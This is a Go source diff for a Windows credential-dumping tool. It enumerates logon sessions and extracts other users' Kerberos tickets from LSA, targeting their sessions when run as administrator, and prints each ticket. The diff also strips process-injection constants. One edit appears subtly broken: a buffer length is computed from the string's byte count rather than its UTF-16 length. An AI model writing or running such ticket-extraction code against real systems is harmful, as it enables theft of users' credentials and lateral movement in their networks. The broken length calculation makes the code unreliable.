@@ -13,13 +13,7 @@ import (
 )
 
 const (
-	MEM_COMMIT                = 0x1000
-	MEM_RESERVE               = 0x2000
-	PAGE_EXECUTE_READWRITE    = 0x40
-	PROCESS_CREATE_THREAD     = 0x0002
 	PROCESS_QUERY_INFORMATION = 0x0400
-	PROCESS_VM_OPERATION      = 0x0008
-	PROCESS_VM_WRITE          = 0x0020
 	PROCESS_VM_READ           = 0x0010
 )
 
@@ -68,40 +62,6 @@ const (
 	TicketAnonymous        TicketFlags = 0x00020000
 	TicketNameCanonicalize TicketFlags = 0x00010000
 )
-
-func (t TicketFlags) String() string {
-	var flags []string
-
-	flagMap := map[TicketFlags]string{
-		TicketReserved:         "reserved",
-		TicketForwardable:      "forwardable",
-		TicketForwarded:        "forwarded",
-		TicketProxiable:        "proxiable",
-		TicketProxy:            "proxy",
-		TicketMayPostdate:      "may_postdate",
-		TicketPostdated:        "postdated",
-		TicketInvalid:          "invalid",
-		TicketRenewable:        "renewable",
-		TicketInitial:          "initial",
-		TicketPreAuthent:       "pre_authent",
-		TicketHWAuthent:        "hw_authent",
-		TicketOkAsDelegate:     "ok_as_delegate",
-		TicketAnonymous:        "anonymous",
-		TicketNameCanonicalize: "name_canonicalize",
-	}
-
-	for flag, name := range flagMap {
-		if t&flag != 0 {
-			flags = append(flags, name)
-		}
-	}
-
-	if len(flags) == 0 {
-		return "empty"
-	}
-
-	return strings.Join(flags, ", ")
-}
 
 const (
 	KerbQueryTicketCacheExMessage    KerbProtocolMessageType = 14
@@ -218,6 +178,11 @@ type LsaString struct {
 	Buffer        uintptr
 }
 
+type SecurityHandle struct {
+	LowPart  uintptr
+	HighPart uintptr
+}
+
 type LogonSessionData struct {
 	LogonID               windows.LUID
 	Username              string
@@ -257,13 +222,13 @@ type KerbTicketCacheInfoEx struct {
 }
 
 type KerbRetrieveTktRequest struct {
-	MessageType    KerbProtocolMessageType
-	_              uint32
-	LogonId        windows.LUID
-	TicketFlags    uint32
-	CacheOptions   uint32
-	EncryptionType int64
-	TargetName     LsaString
+	MessageType       KerbProtocolMessageType
+	LogonId           windows.LUID
+	TargetName        LsaString
+	TicketFlags       uint32
+	CacheOptions      uint32
+	EncryptionType    int64
+	CredentialsHandle SecurityHandle
 }
 
 type KerbRetrieveTktResponse struct {
@@ -327,10 +292,43 @@ func fileTimeToTime(fileTime int64) time.Time {
 	return time.Unix(0, nsec).Local()
 }
 
+func (t TicketFlags) String() string {
+	var flags []string
+
+	flagMap := map[TicketFlags]string{
+		TicketReserved:         "reserved",
+		TicketForwardable:      "forwardable",
+		TicketForwarded:        "forwarded",
+		TicketProxiable:        "proxiable",
+		TicketProxy:            "proxy",
+		TicketMayPostdate:      "may_postdate",
+		TicketPostdated:        "postdated",
+		TicketInvalid:          "invalid",
+		TicketRenewable:        "renewable",
+		TicketInitial:          "initial",
+		TicketPreAuthent:       "pre_authent",
+		TicketHWAuthent:        "hw_authent",
+		TicketOkAsDelegate:     "ok_as_delegate",
+		TicketAnonymous:        "anonymous",
+		TicketNameCanonicalize: "name_canonicalize",
+	}
+
+	for flag, name := range flagMap {
+		if t&flag != 0 {
+			flags = append(flags, name)
+		}
+	}
+
+	if len(flags) == 0 {
+		return "empty"
+	}
+
+	return strings.Join(flags, ", ")
+}
+
 /*
 asn.1 helper funcs
 */
-
 func parseTicketData(encodedTicket []byte) (*KrbCred, error) {
 	fmt.Printf("[*] Parsing ticket data (%d bytes)\n", len(encodedTicket))
 	var krbCred KrbCred
@@ -356,21 +354,6 @@ func lsaStrToString(s LsaString) string {
 	buf := make([]uint16, s.Length/2)
 	copy(buf, (*[1 << 30]uint16)(unsafe.Pointer(s.Buffer))[:s.Length/2])
 	return windows.UTF16ToString(buf)
-}
-
-func normalizeTargetName(targetName string) string {
-	// Convert forward slashes to backslashes
-	name := strings.ReplaceAll(targetName, "/", "\\")
-
-	// If it's a krbtgt ticket, ensure proper format
-	if strings.HasPrefix(strings.ToLower(name), "krbtgt\\") {
-		parts := strings.Split(name, "\\")
-		if len(parts) >= 2 {
-			return fmt.Sprintf("krbtgt\\%s", strings.ToUpper(parts[1]))
-		}
-	}
-
-	return name
 }
 
 func enumerateLogonSessions() ([]windows.LUID, error) {
@@ -505,46 +488,37 @@ func extractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 		return nil, fmt.Errorf("invalid LSA handle")
 	}
 
-	// Check if running with admin privileges
 	isAdmin, _ := isAdmin()
 
 	targetName = strings.ReplaceAll(targetName, "/", "\\")
 
-	// Convert target name to UTF16 and calculate sizes
 	targetNameUTF16 := windows.StringToUTF16(targetName)
-	nameLen := uint16(len(targetNameUTF16) * 2) // Length in bytes
+	nameLen := uint16(len(targetName) * 2)
 
-	// Calculate total size needed for request
 	requestSize := unsafe.Sizeof(KerbRetrieveTktRequest{})
 	totalSize := requestSize + uintptr(nameLen)
 
-	// Allocate buffer for the entire request
 	buffer := make([]byte, totalSize)
 	bufferPtr := unsafe.Pointer(&buffer[0])
 
-	// Set up the request at the start of the buffer
 	request := (*KerbRetrieveTktRequest)(bufferPtr)
 	request.MessageType = KerbRetrieveEncodedTicketMessage
 
-	// If not admin, use null LUID
 	if !isAdmin {
-		request.LogonId = windows.LUID{} // Use 0:0 LUID for current session
+		request.LogonId = windows.LUID{}
 	} else {
 		request.LogonId = luid
 	}
 
 	request.TicketFlags = 0
-	request.CacheOptions = KerbRetrieveTicketAsKerbCred
+	request.CacheOptions = 8
 	request.EncryptionType = 0
 
-	// Calculate where to put the target name string
 	targetNamePtr := uintptr(bufferPtr) + requestSize
 
-	// Copy the UTF16 string to the buffer
-	copy((*[1 << 30]byte)(unsafe.Pointer(targetNamePtr))[:nameLen],
+	copy(unsafe.Slice((*byte)(unsafe.Pointer(targetNamePtr)), nameLen),
 		unsafe.Slice((*byte)(unsafe.Pointer(&targetNameUTF16[0])), nameLen))
 
-	// Set up the LSA string structure to point to our target name
 	request.TargetName = LsaString{
 		Length:        nameLen - 2, // Subtract null terminator
 		MaximumLength: nameLen,
@@ -908,8 +882,7 @@ func GetKerberosTickets() []map[string]interface{} {
 	for _, cred := range sessionCreds {
 		fmt.Printf("[*] Processing tickets for %s\\%s\n", cred.LogonSession.LogonDomain, cred.LogonSession.Username)
 		for _, ticket := range cred.Tickets {
-			normalizedTarget := normalizeTargetName(ticket.ServerName)
-			extractedTicket, err := extractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, normalizedTarget)
+			extractedTicket, err := extractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
 			if err != nil {
 				fmt.Printf("[-] Failed to extract ticket for %s: %v\n", ticket.ServerName, err)
 				continue
